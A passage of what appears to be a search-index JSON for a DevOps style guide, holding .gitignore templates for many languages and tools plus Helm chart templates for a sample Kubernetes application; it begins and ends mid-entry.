Action","text":"<pre><code>steps:\n  - uses: actions/checkout@v4\n\n  - name: Setup Python environment\n    uses: ./.github/actions/setup-python-env\n    with:\n      python-version: \"3.10\"\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#references","title":"References","text":"","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#official-documentation","title":"Official Documentation","text":"<ul> <li>GitHub Actions Documentation</li> <li>Workflow Syntax</li> <li>GitHub Actions Marketplace</li> </ul>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#best-practices_1","title":"Best Practices","text":"<ul> <li>GitHub Actions Best Practices</li> <li>Workflow Security</li> </ul>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#useful-actions","title":"Useful Actions","text":"<ul> <li>actions/checkout</li> <li>actions/setup-python</li> <li>actions/setup-node</li> <li>docker/build-push-action</li> <li>hashicorp/setup-terraform</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/gitignore_templates/","title":".gitignore Templates","text":"","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#overview","title":"Overview","text":"<p>This document provides comprehensive <code>.gitignore</code> templates for all languages and frameworks covered in this style guide. Use these templates to exclude build artifacts, dependencies, IDE files, and sensitive data from version control.</p>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#python","title":"Python","text":"<pre><code>## Byte-compiled / optimized / DLL files\n__pycache__/\n*.py[cod]\n*$py.class\n\n## C extensions\n*.so\n\n## Distribution / packaging\n.Python\nbuild/\ndevelop-eggs/\ndist/\ndownloads/\neggs/\n.eggs/\nlib/\nlib64/\nparts/\nsdist/\nvar/\nwheels/\npip-wheel-metadata/\nshare/python-wheels/\n*.egg-info/\n.installed.cfg\n*.egg\nMANIFEST\n\n## PyInstaller\n*.manifest\n*.spec\n\n## Installer logs\npip-log.txt\npip-delete-this-directory.txt\n\n## Unit test / coverage reports\nhtmlcov/\n.tox/\n.nox/\n.coverage\n.coverage.*\n.cache\nnosetests.xml\ncoverage.xml\n*.cover\n*.py,cover\n.hypothesis/\n.pytest_cache/\n.ruff_cache/\n\n## Translations\n*.mo\n*.pot\n\n## Django\n*.log\nlocal_settings.py\ndb.sqlite3\ndb.sqlite3-journal\n\n## Flask\ninstance/\n.webassets-cache\n\n## Scrapy\n.scrapy\n\n## Sphinx documentation\ndocs/_build/\n\n## PyBuilder\ntarget/\n\n## Jupyter Notebook\n.ipynb_checkpoints\n\n## IPython\nprofile_default/\nipython_config.py\n\n## pyenv\n.python-version\n\n## pipenv\nPipfile.lock\n\n## poetry\npoetry.lock\n\n## PEP 582\n__pypackages__/\n\n## Celery\ncelerybeat-schedule\ncelerybeat.pid\n\n## SageMath\n*.sage.py\n\n## Environments\n.env\n.venv\nenv/\nvenv/\nENV/\nenv.bak/\nvenv.bak/\n\n## Spyder\n.spyderproject\n.spyproject\n\n## Rope\n.ropeproject\n\n## mkdocs\n/site\n\n## mypy\n.mypy_cache/\n.dmypy.json\ndmypy.json\n\n## Pyre\n.pyre/\n\n## pytype\n.pytype/\n\n## Cython\ncython_debug/\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#typescript-javascript-nodejs","title":"TypeScript / JavaScript / Node.js","text":"<pre><code>## Logs\nlogs\n*.log\nnpm-debug.log*\nyarn-debug.log*\nyarn-error.log*\nlerna-debug.log*\npnpm-debug.log*\n\n## Diagnostic reports\nreport.[0-9]*.[0-9]*.[0-9]*.[0-9]*.json\n\n## Runtime data\npids\n*.pid\n*.seed\n*.pid.lock\n\n## Directory for instrumented libs\nlib-cov\n\n## Coverage directory\ncoverage\n*.lcov\n.nyc_output\n\n## Grunt intermediate storage\n.grunt\n\n## Bower dependency directory\nbower_components\n\n## node-waf configuration\n.lock-wscript\n\n## Compiled binary addons\nbuild/Release\n\n## Dependency directories\nnode_modules/\njspm_packages/\n\n## Snowpack dependency directory\nweb_modules/\n\n## TypeScript cache\n*.tsbuildinfo\n\n## Optional npm cache directory\n.npm\n\n## Optional eslint cache\n.eslintcache\n\n## Optional stylelint cache\n.stylelintcache\n\n## Microbundle cache\n.rpt2_cache/\n.rts2_cache_cjs/\n.rts2_cache_es/\n.rts2_cache_umd/\n\n## Optional REPL history\n.node_repl_history\n\n## Output of 'npm pack'\n*.tgz\n\n## Yarn\n.yarn-integrity\n.yarn/cache\n.yarn/unplugged\n.yarn/build-state.yml\n.yarn/install-state.gz\n.pnp.*\n\n## parcel-bundler cache\n.cache\n.parcel-cache\n\n## Next.js\n.next/\nout/\n\n## Nuxt.js\n.nuxt\ndist\n\n## Gatsby\n.cache/\npublic\n\n## vuepress\n.vuepress/dist\n\n## Serverless\n.serverless/\n\n## FuseBox\n.fusebox/\n\n## DynamoDB Local\n.dynamodb/\n\n## TernJS\n.tern-port\n\n## Stores VSCode versions\n.vscode-test\n\n## yarn v2\n.yarn/cache\n.yarn/unplugged\n.yarn/build-state.yml\n.yarn/install-state.gz\n.pnp.*\n\n## Turborepo\n.turbo\n\n## Vercel\n.vercel\n\n## Environment variables\n.env\n.env.local\n.env.development.local\n.env.test.local\n.env.production.local\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#terraform","title":"Terraform","text":"<pre><code>## Local .terraform directories\n**/.terraform/*\n\n## .tfstate files\n*.tfstate\n*.tfstate.*\n\n## Crash log files\ncrash.log\ncrash.*.log\n\n## Exclude all .tfvars files (may contain sensitive data)\n*.tfvars\n*.tfvars.json\n\n## Ignore override files\noverride.tf\noverride.tf.json\n*_override.tf\n*_override.tf.json\n\n## Include override files you do wish to add to version control\n## !example_override.tf\n\n## Include tfplan files to ignore the plan output of command: terraform plan -out=tfplan\n## *tfplan*\n\n## Ignore CLI configuration files\n.terraformrc\nterraform.rc\n\n## Terraform lock file (uncomment to ignore)\n## .terraform.lock.hcl\n\n## Terragrunt cache\n.terragrunt-cache/\n\n## Terraform provider cache\n.terraform.d/\n\n## Sentinel runtime directory\n.sentinel\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#ansible","title":"Ansible","text":"<pre><code>## Ansible retry files\n*.retry\n\n## Ansible vault password files\n.vault_pass\nvault_pass.txt\n.vault-password\n\n## Ansible temporary files\n.ansible/\n\n## Inventory files with sensitive data\ninventory/production/hosts\ninventory/production/*.yml\n\n## Ansible roles downloaded by ansible-galaxy\nroles/*/\n!roles/.gitkeep\n\n## Molecule\n.molecule/\nmolecule/.cache/\n\n## Python virtualenv\nvenv/\n.venv/\n\n## Logs\n*.log\n\n## Test results\ntest-results/\n\n## Collections\ncollections/\n\n## Variables with secrets\ngroup_vars/*/vault.yml\nhost_vars/*/vault.yml\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#bash","title":"Bash","text":"<pre><code>## Logs\n*.log\n\n## Backup files\n*~\n*.bak\n*.swp\n*.swo\n*.tmp\n\n## Shell history\n.bash_history\n.zsh_history\n\n## Environment files\n.env\n.env.local\n\n## Scripts output\noutput/\nlogs/\n\n## Lock files\n*.lock\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#powershell","title":"PowerShell","text":"<pre><code>## Logs\n*.log\n*.txt\n\n## Module directories\nPSScriptAnalyzerSettings/\n\n## Test results\nTestResults/\n*.trx\n\n## Package files\n*.nupkg\n*.zip\n\n## Environment files\n.env\n.env.local\n\n## PowerShell profile backups\nprofile.ps1.bak\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#go","title":"Go","text":"<pre><code>## Binaries for programs and plugins\n*.exe\n*.exe~\n*.dll\n*.so\n*.dylib\n\n## Test binary, built with `go test -c`\n*.test\n\n## Output of the go coverage tool\n*.out\n\n## Dependency directories\nvendor/\n\n## Go workspace file\ngo.work\n\n## Build output\nbin/\ndist/\nbuild/\n\n## IDEs\n.idea/\n*.swp\n*.swo\n*~\n\n## Air (live reload for Go)\ntmp/\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#sql","title":"SQL","text":"<pre><code>## Database files\n*.db\n*.sqlite\n*.sqlite3\n*.db-shm\n*.db-wal\n\n## Backup files\n*.bak\n*.backup\n*.sql.bak\n\n## Query logs\n*.log\n\n## Migration generated files\nmigrations/tmp/\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#docker","title":"Docker","text":"<pre><code>## Docker build context\n.dockerignore\n\n## Docker volumes\nvolumes/\n\n## Docker secrets\nsecrets/\n*.secret\n\n## Build artifacts\n.docker/\n\n## Environment files\n.env\n.env.local\ndocker-compose.override.yml\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#jenkins-groovy","title":"Jenkins / Groovy","text":"<pre><code>## Jenkins\n.jenkins\njobs/\nworkspace/\nbuilds/\nlogs/\n\n## Groovy compiled classes\n*.class\n\n## Logs\n*.log\n\n## Temporary files\n*.tmp\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#kubernetes-helm","title":"Kubernetes / Helm","text":"<pre><code>## Helm\ncharts/*/charts/\n*.tgz\n\n## Kubernetes secrets\nsecrets.yml\nsecrets.yaml\n*-secrets.yml\n*-secrets.yaml\n\n## Kustomize\nkustomization.yaml.bak\n\n## Temporary manifests\ntmp/\ntemp/\n\n## Rendered templates\nrendered/\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#general-ide-editor-files","title":"General IDE / Editor Files","text":"<pre><code>## VSCode\n.vscode/\n*.code-workspace\n\n## IntelliJ IDEA\n.idea/\n*.iml\n*.ipr\n*.iws\nout/\n\n## Eclipse\n.project\n.classpath\n.settings/\nbin/\n\n## Sublime Text\n*.sublime-project\n*.sublime-workspace\n\n## Vim\n*.swp\n*.swo\n*~\n.netrwhist\n\n## Emacs\n*~\n\\#*\\#\n/.emacs.desktop\n/.emacs.desktop.lock\n*.elc\nauto-save-list\ntramp\n.\\#*\n\n## JetBrains\n.idea/\n*.iml\n*.ipr\n*.iws\n.idea_modules/\n\n## Atom\n.atom/\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#general-os-files","title":"General OS Files","text":"<pre><code>## macOS\n.DS_Store\n.AppleDouble\n.LSOverride\nIcon\n._*\n.DocumentRevisions-V100\n.fseventsd\n.Spotlight-V100\n.TemporaryItems\n.Trashes\n.VolumeIcon.icns\n.com.apple.timemachine.donotpresent\n.AppleDB\n.AppleDesktop\nNetwork Trash Folder\nTemporary Items\n.apdisk\n\n## Windows\nThumbs.db\nThumbs.db:encryptable\nehthumbs.db\nehthumbs_vista.db\n*.stackdump\n[Dd]esktop.ini\n$RECYCLE.BIN/\n*.cab\n*.msi\n*.msix\n*.msm\n*.msp\n*.lnk\n\n## Linux\n*~\n.fuse_hidden*\n.directory\n.Trash-*\n.nfs*\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#combined-devops-gitignore","title":"Combined DevOps .gitignore","text":"<pre><code>## ============================================\n## Combined DevOps .gitignore Template\n## ============================================\n\n## ----------------\n## Python\n## ----------------\n__pycache__/\n*.py[cod]\n*$py.class\n*.so\n.Python\nbuild/\ndist/\n*.egg-info/\n.pytest_cache/\n.coverage\nhtmlcov/\nvenv/\n.venv/\n.env\n\n## ----------------\n## Node.js / TypeScript\n## ----------------\nnode_modules/\nnpm-debug.log*\nyarn-error.log*\n.next/\n.nuxt/\ndist/\n*.tsbuildinfo\n.eslintcache\n\n## ----------------\n## Terraform\n## ----------------\n.terraform/\n*.tfstate\n*.tfstate.*\n*.tfvars\n.terraform.lock.hcl\n.terragrunt-cache/\n\n## ----------------\n## Ansible\n## ----------------\n*.retry\n.ansible/\nroles/*/\n.molecule/\n\n## ----------------\n## Docker\n## ----------------\n.dockerignore\ndocker-compose.override.yml\n\n## ----------------\n## Kubernetes / Helm\n## ----------------\ncharts/*/charts/\n*.tgz\nsecrets.yml\nsecrets.yaml\n\n## ----------------\n## CI/CD\n## ----------------\n.jenkins/\n.github/workflows/*.log\n\n## ----------------\n## IDE / Editors\n## ----------------\n.vscode/\n.idea/\n*.swp\n*.swo\n*.iml\n\n## ----------------\n## OS\n## ----------------\n.DS_Store\nThumbs.db\n*~\n\n## ----------------\n## Logs &amp; Temporary Files\n## ----------------\n*.log\n*.tmp\n*.bak\nlogs/\ntmp/\n\n## ----------------\n## Secrets &amp; Credentials\n## ----------------\n*.pem\n*.key\n*.crt\n*credentials*\n*secret*\n.env\n.env.*\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#multi-language-project-gitignore","title":"Multi-Language Project .gitignore","text":"<pre><code>## ============================================\n## Multi-Language Project .gitignore\n## ============================================\n\n## ----------------\n## Dependencies\n## ----------------\nnode_modules/\nvendor/\nvenv/\n.venv/\n\n## ----------------\n## Build Artifacts\n## ----------------\nbuild/\ndist/\nout/\ntarget/\nbin/\n*.exe\n*.dll\n*.so\n*.dylib\n\n## ----------------\n## Test &amp; Coverage\n## ----------------\ncoverage/\n.coverage\nhtmlcov/\n.pytest_cache/\n.nyc_output/\ntest-results/\n*.test\n\n## ----------------\n## Package Files\n## ----------------\n*.egg-info/\n*.nupkg\n*.tgz\n*.tar.gz\n*.zip\n\n## ----------------\n## Infrastructure\n## ----------------\n.terraform/\n*.tfstate\n*.tfstate.*\n.terragrunt-cache/\n.ansible/\n\n## ----------------\n## Environment &amp; Config\n## ----------------\n.env\n.env.local\n.env.*.local\n*.tfvars\nsecrets/\ncredentials/\n\n## ----------------\n## IDE &amp; Editors\n## ----------------\n.vscode/\n.idea/\n*.swp\n*.swo\n*~\n.project\n.classpath\n\n## ----------------\n## OS Files\n## ----------------\n.DS_Store\nThumbs.db\nDesktop.ini\n\n## ----------------\n## Logs\n## ----------------\n*.log\nlogs/\nnpm-debug.log*\nyarn-debug.log*\n\n## ----------------\n## Cache\n## ----------------\n.cache/\n.eslintcache\n.ruff_cache/\n.mypy_cache/\n*.tsbuildinfo\n\n## ----------------\n## CI/CD\n## ----------------\n.github/workflows/*.log\n.jenkins/\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#language-specific-additions","title":"Language-Specific Additions","text":"","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#go-projects","title":"Go Projects","text":"<pre><code>## Go\nvendor/\n*.test\n*.out\ngo.work\nbin/\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#ruby-projects","title":"Ruby Projects","text":"<pre><code>## Ruby\n*.gem\n*.rbc\n/.config\n/coverage/\n/InstalledFiles\n/pkg/\n/spec/reports/\n/spec/examples.txt\n/test/tmp/\n/test/version_tmp/\n/tmp/\n.bundle\n.byebug_history\n.rspec_status\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#java-projects","title":"Java Projects","text":"<pre><code>## Java\n*.class\n*.jar\n*.war\n*.ear\n*.nar\ntarget/\npom.xml.tag\npom.xml.releaseBackup\npom.xml.versionsBackup\ndependency-reduced-pom.xml\n.classpath\n.project\n.settings/\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#rust-projects","title":"Rust Projects","text":"<pre><code>## Rust\ntarget/\nCargo.lock\n**/*.rs.bk\n*.pdb\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#cc-projects","title":"C/C++ Projects","text":"<pre><code>## C/C++\n*.o\n*.obj\n*.exe\n*.out\n*.app\n*.i*86\n*.x86_64\n*.hex\n*.dSYM/\n*.su\n*.idb\n*.pdb\n*.ilk\n*.map\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#best-practices","title":"Best Practices","text":"","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#general-rules","title":"General Rules","text":"<ol> <li>Version Control Sensitive Data: Never commit:</li> <li>API keys, passwords, tokens</li> <li>Private keys, certificates</li> <li>Database credentials</li> <li> <p>Environment variables with secrets</p> </li> <li> <p>Exclude Build Artifacts:</p> </li> <li>Compiled code</li> <li>Distribution packages</li> <li> <p>Dependency directories</p> </li> <li> <p>Ignore IDE Files:</p> </li> <li>Personal workspace settings</li> <li> <p>Project-specific IDE configurations</p> </li> <li> <p>Keep It Updated:</p> </li> <li>Review and update <code>.gitignore</code> regularly</li> <li>Add new patterns as project evolves</li> </ol>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#using-gitignore","title":"Using .gitignore","text":"<pre><code>## Check if a file would be ignored\ngit check-ignore -v path/to/file\n\n## Remove already tracked files from git\ngit rm --cached &lt;file&gt;\ngit rm -r --cached &lt;directory&gt;\n\n## Force add an ignored file (use carefully)\ngit add -f &lt;file&gt;\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#global-gitignore","title":"Global .gitignore","text":"<pre><code>## Set global .gitignore for all repositories\ngit config --global core.excludesfile ~/.gitignore_global\n\n## Create global .gitignore\ncat &gt; ~/.gitignore_global &lt;&lt;EOF\n.DS_Store\n.vscode/\n.idea/\n*.swp\nEOF\n</code></pre>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#references","title":"References","text":"","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#official-documentation","title":"Official Documentation","text":"<ul> <li>Git Documentation - gitignore</li> <li>GitHub .gitignore Templates</li> <li>Gitignore.io</li> </ul>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/gitignore_templates/#tools","title":"Tools","text":"<ul> <li>gitignore.io - Generate .gitignore files</li> <li>git check-ignore - Debug .gitignore rules</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["gitignore","git","templates","version-control"]},{"location":"04_templates/helm_chart_template/","title":"Helm Chart Template","text":"","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#overview","title":"Overview","text":"<p>This document provides comprehensive Helm chart templates for packaging and deploying Kubernetes applications. Helm charts enable version control, templating, and dependency management for Kubernetes deployments.</p>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#chart-structure","title":"Chart Structure","text":"<pre><code>my-app/\n\u251c\u2500\u2500 Chart.yaml\n\u251c\u2500\u2500 values.yaml\n\u251c\u2500\u2500 values-dev.yaml\n\u251c\u2500\u2500 values-prod.yaml\n\u251c\u2500\u2500 templates/\n\u2502   \u251c\u2500\u2500 NOTES.txt\n\u2502   \u251c\u2500\u2500 _helpers.tpl\n\u2502   \u251c\u2500\u2500 deployment.yaml\n\u2502   \u251c\u2500\u2500 service.yaml\n\u2502   \u251c\u2500\u2500 ingress.yaml\n\u2502   \u251c\u2500\u2500 configmap.yaml\n\u2502   \u251c\u2500\u2500 secret.yaml\n\u2502   \u251c\u2500\u2500 serviceaccount.yaml\n\u2502   \u251c\u2500\u2500 hpa.yaml\n\u2502   \u251c\u2500\u2500 pdb.yaml\n\u2502   \u2514\u2500\u2500 tests/\n\u2502       \u2514\u2500\u2500 test-connection.yaml\n\u251c\u2500\u2500 charts/\n\u2514\u2500\u2500 .helmignore\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#chartyaml","title":"Chart.yaml","text":"<pre><code>apiVersion: v2\nname: my-app\ndescription: A Helm chart for deploying my-app on Kubernetes\ntype: application\nversion: 1.0.0\nappVersion: \"1.0.0\"\n\nkeywords:\n  - web\n  - microservice\n  - api\n\nhome: https://github.com/myorg/my-app\nsources:\n  - https://github.com/myorg/my-app\n\nmaintainers:\n  - name: Your Name\n    email: your.email@example.com\n    url: https://github.com/yourhandle\n\ndependencies:\n  - name: postgresql\n    version: 12.1.0\n    repository: https://charts.bitnami.com/bitnami\n    condition: postgresql.enabled\n\n  - name: redis\n    version: 17.0.0\n    repository: https://charts.bitnami.com/bitnami\n    condition: redis.enabled\n\nannotations:\n  category: Application\n  licenses: Apache-2.0\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#valuesyaml","title":"values.yaml","text":"<pre><code>## Default values for my-app\nreplicaCount: 2\n\nimage:\n  repository: myorg/my-app\n  pullPolicy: IfNotPresent\n  tag: \"\"  # Overrides the image tag (default is chart appVersion)\n\nimagePullSecrets: []\nnameOverride: \"\"\nfullnameOverride: \"\"\n\nserviceAccount:\n  create: true\n  annotations: {}\n  name: \"\"\n\npodAnnotations:\n  prometheus.io/scrape: \"true\"\n  prometheus.io/port: \"8080\"\n  prometheus.io/path: \"/metrics\"\n\npodSecurityContext:\n  runAsNonRoot: true\n  runAsUser: 1000\n  fsGroup: 1000\n\nsecurityContext:\n  capabilities:\n    drop:\n      - ALL\n  readOnlyRootFilesystem: true\n  allowPrivilegeEscalation: false\n\nservice:\n  type: ClusterIP\n  port: 80\n  targetPort: 8080\n  annotations: {}\n\ningress:\n  enabled: false\n  className: \"nginx\"\n  annotations:\n    cert-manager.io/cluster-issuer: \"letsencrypt-prod\"\n  hosts:\n    - host: my-app.example.com\n      paths:\n        - path: /\n          pathType: Prefix\n  tls:\n    - secretName: my-app-tls\n      hosts:\n        - my-app.example.com\n\nresources:\n  limits:\n    cpu: 500m\n    memory: 512Mi\n  requests:\n    cpu: 250m\n    memory: 256Mi\n\nautoscaling:\n  enabled: false\n  minReplicas: 2\n  maxReplicas: 10\n  targetCPUUtilizationPercentage: 80\n  targetMemoryUtilizationPercentage: 80\n\nnodeSelector: {}\n\ntolerations: []\n\naffinity:\n  podAntiAffinity:\n    preferredDuringSchedulingIgnoredDuringExecution:\n      - weight: 100\n        podAffinityTerm:\n          labelSelector:\n            matchExpressions:\n              - key: app.kubernetes.io/name\n                operator: In\n                values:\n                  - my-app\n          topologyKey: kubernetes.io/hostname\n\n## Application configuration\nconfig:\n  logLevel: info\n  port: 8080\n  environment: production\n\n## Environment variables\nenv:\n  - name: NODE_ENV\n    value: production\n  - name: LOG_LEVEL\n    valueFrom:\n      configMapKeyRef:\n        name: my-app-config\n        key: logLevel\n\n## Secrets\nsecrets:\n  enabled: true\n  data:\n    DATABASE_URL: \"\"\n    API_KEY: \"\"\n\n## Health checks\nlivenessProbe:\n  httpGet:\n    path: /health\n    port: http\n  initialDelaySeconds: 30\n  periodSeconds: 10\n  timeoutSeconds: 5\n  failureThreshold: 3\n\nreadinessProbe:\n  httpGet:\n    path: /ready\n    port: http\n  initialDelaySeconds: 10\n  periodSeconds: 5\n  timeoutSeconds: 3\n  failureThreshold: 3\n\n## Pod Disruption Budget\npodDisruptionBudget:\n  enabled: false\n  minAvailable: 1\n\n## Persistent Volume\npersistence:\n  enabled: false\n  storageClass: \"\"\n  accessMode: ReadWriteOnce\n  size: 10Gi\n  mountPath: /data\n\n## PostgreSQL dependency\npostgresql:\n  enabled: true\n  auth:\n    username: myapp\n    password: \"\"\n    database: myappdb\n  primary:\n    persistence:\n      enabled: true\n      size: 10Gi\n\n## Redis dependency\nredis:\n  enabled: true\n  auth:\n    enabled: true\n    password: \"\"\n  master:\n    persistence:\n      enabled: true\n      size: 8Gi\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#templates_helperstpl","title":"templates/_helpers.tpl","text":"<pre><code>{{/*\nExpand the name of the chart.\n*/}}\n{{- define \"my-app.name\" -}}\n{{- default .Chart.Name .Values.nameOverride | trunc 63 | trimSuffix \"-\" }}\n{{- end }}\n\n{{/*\nCreate a default fully qualified app name.\n*/}}\n{{- define \"my-app.fullname\" -}}\n{{- if .Values.fullnameOverride }}\n{{- .Values.fullnameOverride | trunc 63 | trimSuffix \"-\" }}\n{{- else }}\n{{- $name := default .Chart.Name .Values.nameOverride }}\n{{- if contains $name .Release.Name }}\n{{- .Release.Name | trunc 63 | trimSuffix \"-\" }}\n{{- else }}\n{{- printf \"%s-%s\" .Release.Name $name | trunc 63 | trimSuffix \"-\" }}\n{{- end }}\n{{- end }}\n{{- end }}\n\n{{/*\nCreate chart name and version as used by the chart label.\n*/}}\n{{- define \"my-app.chart\" -}}\n{{- printf \"%s-%s\" .Chart.Name .Chart.Version | replace \"+\" \"_\" | trunc 63 | trimSuffix \"-\" }}\n{{- end }}\n\n{{/*\nCommon labels\n*/}}\n{{- define \"my-app.labels\" -}}\nhelm.sh/chart: {{ include \"my-app.chart\" . }}\n{{ include \"my-app.selectorLabels\" . }}\n{{- if .Chart.AppVersion }}\napp.kubernetes.io/version: {{ .Chart.AppVersion | quote }}\n{{- end }}\napp.kubernetes.io/managed-by: {{ .Release.Service }}\n{{- end }}\n\n{{/*\nSelector labels\n*/}}\n{{- define \"my-app.selectorLabels\" -}}\napp.kubernetes.io/name: {{ include \"my-app.name\" . }}\napp.kubernetes.io/instance: {{ .Release.Name }}\n{{- end }}\n\n{{/*\nCreate the name of the service account to use\n*/}}\n{{- define \"my-app.serviceAccountName\" -}}\n{{- if .Values.serviceAccount.create }}\n{{- default (include \"my-app.fullname\" .) .Values.serviceAccount.name }}\n{{- else }}\n{{- default \"default\" .Values.serviceAccount.name }}\n{{- end }}\n{{- end }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#templatesdeploymentyaml","title":"templates/deployment.yaml","text":"<pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: {{ include \"my-app.fullname\" . }}\n  labels:\n    {{- include \"my-app.labels\" . | nindent 4 }}\nspec:\n  {{- if not .Values.autoscaling.enabled }}\n  replicas: {{ .Values.replicaCount }}\n  {{- end }}\n  selector:\n    matchLabels:\n      {{- include \"my-app.selectorLabels\" . | nindent 6 }}\n  template:\n    metadata:\n      annotations:\n        checksum/config: {{ include (print $.Template.BasePath \"/configmap.yaml\") . | sha256sum }}\n        checksum/secret: {{ include (print $.Template.BasePath \"/secret.yaml\") . | sha256sum }}\n        {{- with .Values.podAnnotations }}\n        {{- toYaml . | nindent 8 }}\n        {{- end }}\n      labels:\n        {{- include \"my-app.selectorLabels\" . | nindent 8 }}\n    spec:\n      {{- with .Values.imagePullSecrets }}\n      imagePullSecrets:\n        {{- toYaml . | nindent 8 }}\n      {{- end }}\n      serviceAccountName: {{ include \"my-app.serviceAccountName\" . }}\n      securityContext:\n        {{- toYaml .Values.podSecurityContext | nindent 8 }}\n      containers:\n        - name: {{ .Chart.Name }}\n          securityContext:\n            {{- toYaml .Values.securityContext | nindent 12 }}\n          image: \"{{ .Values.image.repository }}:{{ .Values.image.tag | default .Chart.AppVersion }}\"\n          imagePullPolicy: {{ .Values.image.pullPolicy }}\n          ports:\n            - name: http\n              containerPort: {{ .Values.config.port }}\n              protocol: TCP\n          env:\n            {{- toYaml .Values.env | nindent 12 }}\n          {{- if .Values.secrets.enabled }}\n          envFrom:\n            - secretRef:\n                name: {{ include \"my-app.fullname\" . }}-secret\n          {{- end }}\n          livenessProbe:\n            {{- toYaml .Values.livenessProbe | nindent 12 }}\n          readinessProbe:\n            {{- toYaml .Values.readinessProbe | nindent 12 }}\n          resources:\n            {{- toYaml .Values.resources | nindent 12 }}\n          {{- if .Values.persistence.enabled }}\n          volumeMounts:\n            - name: data\n              mountPath: {{ .Values.persistence.mountPath }}\n          {{- end }}\n      {{- if .Values.persistence.enabled }}\n      volumes:\n        - name: data\n          persistentVolumeClaim:\n            claimName: {{ include \"my-app.fullname\" . }}-pvc\n      {{- end }}\n      {{- with .Values.nodeSelector }}\n      nodeSelector:\n        {{- toYaml . | nindent 8 }}\n      {{- end }}\n      {{- with .Values.affinity }}\n      affinity:\n        {{- toYaml . | nindent 8 }}\n      {{- end }}\n      {{- with .Values.tolerations }}\n      tolerations:\n        {{- toYaml . | nindent 8 }}\n      {{- end }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#templatesserviceyaml","title":"templates/service.yaml","text":"<pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: {{ include \"my-app.fullname\" . }}\n  labels:\n    {{- include \"my-app.labels\" . | nindent 4 }}\n  {{- with .Values.service.annotations }}\n  annotations:\n    {{- toYaml . | nindent 4 }}\n  {{- end }}\nspec:\n  type: {{ .Values.service.type }}\n  ports:\n    - port: {{ .Values.service.port }}\n      targetPort: {{ .Values.service.targetPort }}\n      protocol: TCP\n      name: http\n  selector:\n    {{- include \"my-app.selectorLabels\" . | nindent 4 }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#templatesingressyaml","title":"templates/ingress.yaml","text":"<pre><code>{{- if .Values.ingress.enabled -}}\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: {{ include \"my-app.fullname\" . }}\n  labels:\n    {{- include \"my-app.labels\" . | nindent 4 }}\n  {{- with .Values.ingress.annotations }}\n  annotations:\n    {{- toYaml . | nindent 4 }}\n  {{- end }}\nspec:\n  {{- if .Values.ingress.className }}\n  ingressClassName: {{ .Values.ingress.className }}\n  {{- end }}\n  {{- if .Values.ingress.tls }}\n  tls:\n    {{- range .Values.ingress.tls }}\n    - hosts:\n        {{- range .hosts }}\n        - {{ . | 